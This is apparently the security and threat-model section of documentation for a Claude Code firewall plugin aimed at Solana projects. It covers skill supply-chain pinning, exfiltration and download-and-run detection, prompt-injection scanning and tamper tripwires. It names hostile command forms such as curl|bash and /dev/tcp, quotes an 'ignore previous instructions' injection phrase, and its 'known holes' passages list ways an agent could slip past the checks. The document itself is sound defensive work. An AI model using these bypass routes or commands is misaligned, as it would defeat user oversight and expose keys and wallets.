**Supply chain.** Every session start runs `verify session` over the installed skills directories, each `ext/` git submodule independently, and the project's `.mcp.json`. It makes no network calls, and it does not read `.claude/settings.json` or the catalog (`registry verify` audits the catalog on demand). The `@latest` MCP posture is flagged as INFORMATIONAL; safe-ai-skill does not treat it as an error when a hub keeps its MCPs `@latest` by design. Since 1.1.0 content that drifts from its pinned hash or git SHA is **blocked in place**: the Skill tool, a typed `/name`, and reads or Bash access inside the pack are denied until you review it, run `safe-ai-skill verify approve <name>` in a terminal and confirm the code safe-ai-skill shows you. A combination rule (for example an exfiltrating `` !`cmd` ``) blocks the same way and no approval clears it. A pack the sweep could not fully scan in its time budget is denied until a later sweep scans it. The action follows the tier: at Off these findings are reported, not denied; from Relaxed they deny in place; a HIGH heuristic (unreviewed) denies only at High, until `verify trust` or `approve`, and a repo `packs.lock` cannot clear it. Packs are moved only with `supply_chain.on_block: move`, never when git tracks them. The sweep covers the project's `.claude/skills`; `~/.claude/skills` only when a project's `.safe-ai-skill/policy.yaml` adds it to `supply_chain.verify_skills_dirs` (the only dir outside the project a project may add), apart from packs installed there with `install --from`.

**Install-script execution.** Runtime `curl|bash`, `wget|bash`, and `curl|sh` patterns are intercepted by `gate-bash-secrets` (unconditional, microsecond matching) before the pipe executes. The default policy is `exec_install_scripts: ask` — the user sees the URL and script preview before approval. The download-and-run gate adds the forms that pipe cannot see: a download then run by a later command, `curl … | python3 -`, `bash -c "$(curl …)"`, PowerShell `iex`, a one-shot `npx`/`pnpm dlx`/`bunx`/`uvx`/`pipx run`/`npm exec` of a package the project doesn't declare, `cargo install --git` outside the Solana, Anza and Anchor organizations, and a Node script run against mainnet. These ask, and deny at High and when headless ([docs/tiers.md](docs/tiers.md#download-and-run)).

## Threat model

safe-ai-skill protects against a careless model and prompt-injected instructions. It is not a sandbox, and its [known holes](#known-holes) are listed above: code that runs unsandboxed as your user can rewrite any user-space state, including grants, pins, the tier file and the plugin's own files. The Claude Code sandbox is the hard boundary, so run Claude Code with it on if you need one. The self-grant tripwire (below) and the gates make tampering by the agent deny or ask, never allow, but they are not a defence against a process that is already running arbitrary code.

### `ext/` submodule supply chain

safe-ai-skill is general-purpose: it verifies whatever `ext/` submodules, skills, and MCPs a given setup ships — any hub, any count, or none. The walkthrough below uses `solanabr/solana-ai-kit` as a concrete worked example because it ships a large, heterogeneous set of submodules; the same verification applies unchanged to any other configuration.

solana-ai-kit, for example, ships 18 third-party `ext/` git submodules: third-party security tools, DeFi protocol SDKs, NFT tooling, and infrastructure integrations (including `ext/ghostsecurity`, `ext/trailofbits`, `ext/jupiter`, `ext/metaplex`, `ext/helius`, `ext/sendai`, `ext/vercel`, and others). Each is an independent supply-chain unit with a different origin, maintainer, and risk profile.

**What can go wrong per submodule:**
- Telemetry preambles in SKILL.md files that POST skill-invocation metadata to third-party endpoints.
- `curl|bash` installer patterns embedded in skill content (e.g., `ext/ghostsecurity`).
- Prompt injection in SKILL.md content (hidden HTML comments, Unicode bidirectional control characters, lookalike substitutions).
- Dependency changes in a submodule's npm/Cargo manifests that introduce CVEs.
- Compromised upstream repository — a submodule commit SHA can change on any `git submodule update`.

**safe-ai-skill's response:** each submodule is walked individually by the `verify session` sweep at `SessionStart`. The git SHA is pinned on first seen (TOFU). On any subsequent session where the SHA has changed — whether from an explicit `resync.sh` update or a stealth mutation — the submodule is blocked in place (High findings at `path:line`) and its paths and skills are denied until the user reviews the changes, runs `safe-ai-skill verify approve <name>` and confirms it.

**No special-casing:** some submodules carry known supply-chain risks — attacker-mutable telemetry endpoints, unsigned tarball installers, and global Bash/Read permission grant patterns. safe-ai-skill treats every `ext/` submodule identically: telemetry preambles and installer patterns are flagged generically by the rule engine (`crates/engine/src/verify/rules/`), and `install` neutralizes telemetry preambles; no submodule is special-cased.

### `@latest` MCP posture

solana-ai-kit configures all 7 MCP servers with `@latest` versions in `.mcp.json`. safe-ai-skill flags these as INFORMATIONAL (LOW) — not as errors — because this is a deliberate posture choice by the kit maintainers, not an oversight. The risk is concrete: an `@latest` entry silently pulls whatever is newest on each install, creating a rug-pull vector where a compromised new release is auto-applied.

safe-ai-skill's response: flag at session start, listing each unpinned server at its `.mcp.json` line. It never rewrites `.mcp.json` silently; `safe-ai-skill add mcp` writes exact versions for the entries it adds, and the user decides when to pin the rest.

**What safe-ai-skill does NOT do:** safe-ai-skill does not gate MCP calls solely on the basis of `@latest` pinning. The runtime `gate-mcp` hook gates by tool name and payload. An `@latest` entry that calls a safe read-only tool is allowed; an entry that calls a sensitive tool is gated regardless of whether it is pinned.

### High-risk catalog classes

solana-ai-kit's `skill-registry.json` includes entries classified by safe-ai-skill as high risk:

| Class | Representative entries | Risk |
|-------|----------------------|------|
| `wallet_signing` | `phantom-mcp` | Requests Phantom wallet to sign arbitrary transactions on behalf of the agent. If the agent is compromised or manipulated, this class of tool can drain the connected wallet. |
| `key_custody` | `x402-proxy-mcp` | Holds BIP-39 mnemonic or derived keys for x402 payment channel operations. Key material is exposed to the MCP process boundary. |
| `installer_script` | `ghostsecurity`, others with `curl\|bash` setup | The `setup_command` or installer invokes a network fetch piped to a shell. The fetched content is not verifiable at catalog-entry-audit time; it can change between audit and execution. |

Entries in `wallet_signing` and `key_custody` force `ask` under the default policy (the class decisions live in the plugin's `default.policy.yaml`; a project's `.safe-ai-skill/policy.yaml` cannot change the catalog). Entries in `installer_script` trigger the `exec_install_scripts` policy gate, which a project policy can only move toward `deny`. At runtime, tools from approved `wallet_signing` entries are gated by `gate-mcp` with a risk-class header in the approval prompt — the user is reminded of the class on every invocation.

### TOCTOU and simulation spoofing

A transaction can pass simulation while the on-chain execution differs (e.g., due to account state changes between simulation and confirmation, or a maliciously constructed instruction sequence that looks benign in simulation). safe-ai-skill gates the *execution command* — the `anchor deploy`, `solana transfer`, or MCP call — not the simulation. This does not fully mitigate sophisticated TOCTOU attacks but ensures that at minimum the execution requires user awareness and approval for high-risk actions, regardless of simulation results.

### Over-permissioned agents

solana-ai-kit sets `enableAllProjectMcpServers: true`, which pre-approves all project MCP tools. safe-ai-skill's `deny` decisions from PreToolUse hooks hold even when `enableAllProjectMcpServers: true` is set — this is a verified property of the Claude Code hook execution order: PreToolUse runs before the permission check, and `permissionDecision: "deny"` is not overridable by project settings. The hard guards (`set_authority`, `account_close`, irreversible on-chain actions, `secret_read`) are enforced unconditionally.

### Secret exfiltration

The exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19), `gates/exfil.rs`) reads the text of Bash network commands (`curl`, `wget`, httpie, `nc`, `socat`, `ssh`, `scp`, `/dev/tcp/…`, `git push`), interpreter one-liners, MCP `url`/`uri`/`href` arguments, browser `evaluate` scripts and `WebFetch` calls (the `gate-webfetch` hook). It denies a request to a host on the tier's list of request-bin, tunnel and paste hosts (`policy/shared/exfil-hosts.list`: 70 hosts at Relaxed, 79 at Medium, 84 at High, none at Off, plus `secrets.exfil_hosts_extra`), and secret-shaped data (a key, token, seed, PEM block or keypair array, also after base64, hex or percent decoding) in the URL or body of a request to any host that isn't a developer service, at every tier. It asks on a base64 or hex blob of 64+ characters, a download from a paste or file-drop host, a `git push` to a remote added on the same line, and a browser script that sends cookies or storage. `gate-bash-secrets` also denies, at every tier, a network command that takes a key file, credential store or env file by path, and env data that can flow into a network sink (a pipe, input redirect or `$(…)` into a network command, an env file loaded into the shell and then expanded into one, a loader whose child reaches the network, `> /dev/tcp/…`, interpreter code that reads it and opens a network client); it asks on an inline `curl`/`wget` POST body to a non-localhost host, except an inline body whose every destination is a known Solana RPC host ([docs/tiers.md](docs/tiers.md#exfiltration-tripwire) lists them), which has no opinion below High and asks at High. Hosts that aren't on the list, IP literals without secret-shaped data, redirects, DNS, `WebSearch`, a secret without a recognisable shape, values already in context and cross-call indirection are not stopped (see [Known holes](#known-holes)); the tripwire is text analysis, so a runtime-built command defeats it. solana-ai-kit's sandbox `deniedDomains`, or your own, enforces the host list at the syscall for sandboxed commands.

Exfiltration vectors in a typical solana-ai-kit session:

- **Keypair file reads** — `Read` tool calls on `~/.config/solana/id.json` or project keypair files; Bash `cat` commands.
- **Telemetry preambles** — SKILL.md files in `ext/` submodules can contain bash blocks that POST to third-party endpoints on skill invocation. `gate-bash-secrets` catches all outbound POST patterns with known telemetry signatures (Convex `/api/mutation`, and config-driven additional endpoint patterns).
- **Environment variable leakage** — `printenv`, `env`, `/proc/*/environ`, and commands that print or expand a secret-named variable. Printing one and reading a process environment are denied; a bare dump is allowed with its secret values blanked in the output. Redaction blanks `NAME = value`, `set -x` trace lines, `grep path:NAME=…` lines, quoted snake_case keys, unquoted YAML/JSON values and the password or `api-key` query value of any URL. A copy of the value under an innocent name (`k=$HELIUS_API_KEY; echo $k`), `eval` with built names, a script that prints it, a secret printed by a tool other than `echo`/`printf`/`print`/`printenv`/`declare -p`, and a `/proc/<pid>/environ` read whose path is not a literal are not seen. A `.env.production` reached through a glob, a differently named symlink or a directory Grep is judged as an ordinary project env read.
- **`curl|bash` runtime execution** — an agent instructed to run a setup script could fetch and execute arbitrary code. `gate-bash-secrets` intercepts these before the pipe executes.

### PII in prompts

Users occasionally paste private key material, seed phrases, or other sensitive data into prompts when troubleshooting. `prompt-guard` matches against these patterns at UserPromptSubmit and blocks the prompt with a reason message before it reaches the model. The pasted text is not removed from disk or screen: Claude Code ends a blocked prompt's message with `Original prompt: <text>` and writes it to the session transcript (and prompt history). Claude Code's `suppressOriginalPrompt` field would drop it from the message, but the docs and changelog give no version for it and don't say older versions ignore unknown fields, so the plugin (which supports Claude Code 2.1.295 and later) doesn't set it: a version that rejected the field would let the prompt through. Even with it, the docs say the text can stay in local files. Rotate a key you pasted.

### MCP CVEs

MCP package vulnerabilities are a concrete, documented risk. safe-ai-skill addresses this at install time: `safe-ai-skill add` queries osv.dev for an exact, non-local npm source (for example `add mcp`'s resolved `pkg@version`) before installation (skip with `--offline`). The session sweep and `verify` make no network calls. The osv.dev API requires no authentication.

### Tool poisoning and prompt injection

Malicious skills can embed instructions targeting the language model in SKILL.md content: hidden HTML comments, "ignore previous instructions" text, Unicode bidirectional control characters, and lookalike unicode substitutions. The rule engine (`verify/rules/`) scans for these patterns before any pack content is pinned; in a SKILL.md description an injection phrase or URL with an action verb is part of the `description_injection` combination (BLOCK). A pack with a code HIGH finding is reported as unreviewed at session start and held at `install`; documentation findings are warnings.

## Design guarantees

**Hard guards are unconditional while the firewall runs.** The hard guards — `set_authority`, `account_close`, irreversible on-chain actions and `secret_read` — are enforced by the engine binary regardless of the active tier (the tier `off` included), any time-boxed grant, or any project policy override; no engine flag or configuration relaxes them. In practice: authority changes and account closes ask (and deny at High on mainnet or an unidentified cluster), secret reads are denied, and irreversible actions deny on mainnet or an unidentified cluster and ask on an identified localnet, devnet or testnet. Non-final deploys, to mainnet included, are counterparty actions a confirmed `deploy` grant can allow below High; `program close` in any form (a buffer included) is irreversible and no grant covers it. Every `deny` row of the tier table holds at the tier `off`; only `SAFE_AI_SKILL_DISABLE=1` turns the hooks off. They stop applying only when the firewall itself is off (not when the tier is `off`): when the user sets `SAFE_AI_SKILL_DISABLE=1`, or when the engine cannot run on the platform (below; Solana CLI commands still ask). SessionStart reports both.

**Fails open only when the engine cannot run, never past a broken gate.** If no engine runs on this platform (no matching prebuilt, not an executable for this OS, exec failure 126/127), the `bin/safe-ai-skill` shim keeps Bash calls naming the Solana CLIs (and the Skill gate) at `ask`, reports the firewall INACTIVE at SessionStart, and lets every other call continue with a one-line notice. An engine crash blocks `gate-bash` (every Bash call), `gate-mcp` and `gate-skill` (exit 2) and is reported at SessionStart. `gate-permission` answers a crash, a tamper or strict mode with a `PermissionRequest` deny (that event does not honour exit 2), and prints nothing when the engine cannot run, so Claude Code shows its own prompt. `SAFE_AI_SKILL_STRICT=1` turns every one of these cases into exit 2 (block). `SAFE_AI_SKILL_DISABLE=1` turns the hooks off unless strict mode is set or the committed `.claude/settings.json` mentions it or can't be read (a repo can't disable the firewall); SessionStart reports it either way. The shim never builds from source and never runs a binary outside its own directory. `gate-bash`, `gate-skill` and `gate-permission` set `onFailure: block`, the others `onFailure: continue` (honoured from Claude Code 2.1.295).

**Residual risk: a repo's settings env is trusted code.** Claude Code applies the `env` of a project's `.claude/settings.json` to every hook. That file can already set `PATH`, `DYLD_*` or `LD_PRELOAD` and so run its own code in place of any hook, so the shim cannot defend against it. The `SAFE_AI_SKILL_DISABLE` check is a plain-text match on that file, which stops the obvious case, not a determined repo. Only open repositories you trust with your Claude Code session, and review `.claude/settings.json` in unfamiliar ones.

**Self-grant tripwire.** It stops the plain ways an agent could loosen the firewall through its own tools; it is not a guarantee. `gate-bash-secrets` denies Bash commands that run `safe-ai-skill confirm|revoke`, `verify approve|trust`, `install` or `add` (which pin or re-pin packs), the hook-only bare `verify` / `verify session` (it pins packs it has not seen before), or a hook subcommand (`prompt-guard`, `pending-notice`, `redact`, any `gate-*`), or that reference protected state, and `gate-tamper` (`Write|Edit|MultiEdit|NotebookEdit`) denies writes to it. `allow` and `tier` stay open to the agent: a grant or a tier lowering only records a request, which takes effect when the user types the code safe-ai-skill shows them alone. A nested Claude Code session (`claude -p …`) that mentions `safe-ai-skill confirm` is denied, and any other non-interactive one (`-p`, `--print`, a prompt piped or redirected into it, also behind wrappers) asks in both Bash gates, a deny at High or headless. A headless, non-interactive or nested session neither announces nor accepts confirmation codes, and a request's code works only in the Claude Code session it belongs to. Confirming always needs an interactive session whose process ancestry the engine can read; the session id alone never vouches, because the agent can steer it (`CLAUDE_CODE_SESSION_ID`, `--session-id`, `--resume`, `-c`). So on native Windows (no process table) and in sandboxed hooks, confirmations (lowering the tier, loosening `env_read`, grants, `verify trust`/`approve`) are unavailable; raising the tier and everything else work, and WSL works for those actions. Whether Desktop-app or IDE hosts run Claude Code in print mode (which can't confirm) is unverified. Residuals: the ancestry check trusts argument words (`exec -a bash claude -p`), a nested run started with the owner's session id (`--resume <id>`, `--session-id`) passes the session binding, and a renamed or linked `claude` binary is not seen by the Bash gates. An MCP tool's directory argument at or above `~/.claude`, `$CLAUDE_CONFIG_DIR`, a transcript tree or the data dir (so `$HOME` and `/` too) is denied, because an MCP search cannot be given exclusions. `failure-notice` cannot scan a failed output larger than 8 MiB; it then tells the model to treat it as possibly secret. Protected state is the plugin data dir (grants, the tier file, spend ledger, pending requests, generations, the state key, locks, the audit log), the legacy `~/.safe-ai-skill` dir, the installed plugin and its `hooks.json`, and the state files of a project `.safe-ai-skill/` dir; a project's `policy.yaml` stays editable because it can only tighten. Reads of the state key and of Claude Code transcripts (`~/.claude/projects`, which record hook messages) are denied too. A command or payload too large or complex to scan asks instead of passing. Run the denied commands yourself in a terminal. This is a tripwire, not a sandbox: encoded commands, variable indirection or scripts written now and run later can get past it; the Claude Code sandbox is the boundary.

**Content-aware tamper checks.** Beyond protected paths, the tripwire reads what a write makes a file say (`gate-tamper` for Write, Edit and MultiEdit; `gate-bash-secrets` for redirects, `tee`, `sed -i`, `mv`/`cp` and interpreter code that opens the file). A change to a Claude Code settings file (`.claude/settings*.json`, `~/.claude`, `$CLAUDE_CONFIG_DIR`) that turns a `safe-ai-skill@…` plugin off or drops it, sets `disableAllHooks`, `allowManagedHooksOnly` or `env.SAFE_AI_SKILL_DISABLE`, sets `permissions.defaultMode: bypassPermissions`, or removes or narrows a guard hook, and an agent definition with `permissionMode: bypassPermissions`, is denied at every tier and never relaxed. It asks on a git hook, a git setting that runs a program (`core.hooksPath`, `core.sshCommand`, `core.fsmonitor`, `!` aliases, filter and diff drivers, `credential.helper` programs; also set by one-shot `git -c`; a bare known editor or pager such as `vim` or `less` passes), a new or changed `.mcp.json` server, a new or changed `package.json` lifecycle script, a kit hook script or a lower kit tier in `.claude/security.json`, an `export`, `launchctl setenv` or `systemctl set-environment` of a `KIT_FIREWALL_*` or `SAFE_AI_SKILL_*` name, and a Bash write to one of these files whose content the command line doesn't show. A NotebookEdit aimed at a settings file asks, not denies. The same residuals apply: encoded commands, variable indirection and scripts written now and run later get past it (a base64-decoded write is judged, but only when the decoded command names the protected path; a write through a hard link that already exists is not seen), and a sandbox `denyWrite` on `.claude/settings*.json` is the control ([docs/tiers.md](docs/tiers.md#tamper-settings-hooks-and-config-content)).

**Residual risk: `SAFE_AI_SKILL_DISABLE` in `.claude/settings.local.json` is honoured.** The shim ignores `SAFE_AI_SKILL_DISABLE=1` only when the committed `.claude/settings.json` mentions it (any `SAFE_AI_SKILL` text or `\u` escape). `.claude/settings.local.json` is the user's own, gitignored file, so a value there switches the firewall off, and SessionStart reports it. A repo that commits a `settings.local.json` anyway, or a tool that writes one into the project, turns the firewall off the same way. Check that `settings.local.json` is ignored by git, and treat a committed one as hostile.

**Residual risk: the shim is the trust anchor.** The shim checks the engine binary against sha256 constants stamped at release and never runs a mismatch. Anything that can write the plugin's `bin/` directory can rewrite the shim and its constants just as easily, and could swap the binary between the hash and the exec. Both are out of reach of the agent through the write tripwire on `~/.claude/plugins`; neither is defended against a local process running as the user.

**Residual risk: the shim's verified-hash cache.** The shim used to hash the engine binary on every hook call. It now records the binary's fingerprint (device, inode, size, mtime, ctime, read with `stat` at a fixed system path) beside the stamped hash in `$CLAUDE_PLUGIN_DATA/shim-verified-<platform>` after a full match, and skips the hash and the executable-format probe while the cache file (a regular file, not a symlink, mode 0600, owned by the binary's owner) holds exactly the stamped hash and the binary's current fingerprint. Anything else is a full check; only a pass is cached. Modifying or replacing the binary changes its ctime, which a user process cannot set, so it forces a rehash, and a binary whose ctime does not predate the check is never cached. The cache adds no capability against a process that can write the plugin's `bin/` directory (it can rewrite the shim and its constants) or the plugin data dir (which holds the grants and the state key). What it does change is the basis of the check between sessions: from a content hash on every call to a fingerprint of the file's metadata, so a process able to set ctime (root, or one that can change the system clock) could make a swapped binary match, which hashing on every call would have caught. The window between the check and the exec is unchanged. The cache is off on Windows (where a user process can set ctime) and when `CLAUDE_PLUGIN_DATA` is unset, relative or not a writable directory. `SAFE_AI_SKILL_SHIM_CACHE=0` turns it off, from any source since it only makes the shim stricter; every hook call then hashes the binary again, which is slower: about 3 to 5 ms per call on macOS with the native `sha256sum` and about 20 to 25 ms where the shim falls back to Perl's `shasum` (taken on a loaded machine, not a benchmark).

**Fail-closed policy.** If the plugin's `default.policy.yaml` cannot be parsed, `policy.rs` falls back to treating all gated actions as `ask`. A project's `.safe-ai-skill/policy.yaml` can only tighten the policy: a setting that would loosen it is ignored and listed at SessionStart, invalid YAML is ignored, and ill-typed values fail closed. The session is not left without gates because of a config file error. The shared lists (`policy/shared/*`) are embedded in the binary at build; if one fails to parse at runtime, the gates that depend on it fall back to a hard-guard `ask`, never to no opinion.

**External API timeouts do not allow.** osv.dev is an external network call. On timeout or API unavailability, the decision is `ask` (not `allow`, not `deny`). The user is informed and must approve. The rugcheck swap check is not wired in 1.0.1 (see below): MCP swaps always `ask`.

**`deny` survives `bypassPermissions`.** Verified against Claude Code official docs (2026-06). Sessions running with `bypassPermissions` cannot override hook `deny` decisions.

**`deny` survives `enableAllProjectMcpServers`.** Verified against Claude Code hook execution order. MCP pre-approval in project settings does not bypass `gate-mcp` PreToolUse decisions.

## Out of scope for v1

### Lighthouse assertions

Lighthouse is a Solana program (`L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95`, deployed mainnet and devnet) that allows embedding verifiable assertions as instructions in a transaction. The assertion is checked on-chain at execution time, not in simulation.

Retrofitting Lighthouse assertions onto a transaction already built by `solana-cli` or `anchor deploy` requires re-signing the transaction. safe-ai-skill gates commands at the CLI/MCP layer, after the transaction has been constructed and before it is submitted. Inserting Lighthouse assertions at this stage without owning the tx-construction path is not possible.

This is deferred to a future "guarded signer" component: an MCP tool that exposes `signAndSend`, holds session-key access, and can simulate, append Lighthouse assertions, and sign in a single controlled step before submission.

### Turnkey

Turnkey is a SaaS wallet-as-a-service product evaluated and skipped for v1. The free tier is 25 total signatures (not per day); beyond that, $0.10 per signature. Phase 3 session keypairs achieve the same spend-cap-by-construction guarantee with zero external dependencies.

### Dual-install detection in `safe-ai-skill doctor`

`safe-ai-skill doctor` checks your Claude Code sandbox settings and prints the `denyRead` entries to add. What it does not do yet is detect a plugin installed together with a full solana-ai-kit config-repo install (both `SessionStart` hooks fire): reporting which gates are active or superseded, and diagnosing `settings.json` overlap, is deferred to a future release.

## Vulnerability reporting

To report a security vulnerability in safe-ai-skill, send email to **security@superteam.com.br** with subject line `[safe-ai-skill] vulnerability report`.

Include in your report:

- A description of the vulnerability and the affected component
- Reproduction steps (include relevant hook payloads, commands, or policy configurations)
- An assessment of the impact and any attack conditions

We will acknowledge receipt within 48 hours. Please allow reasonable time for assessment before public disclosure.
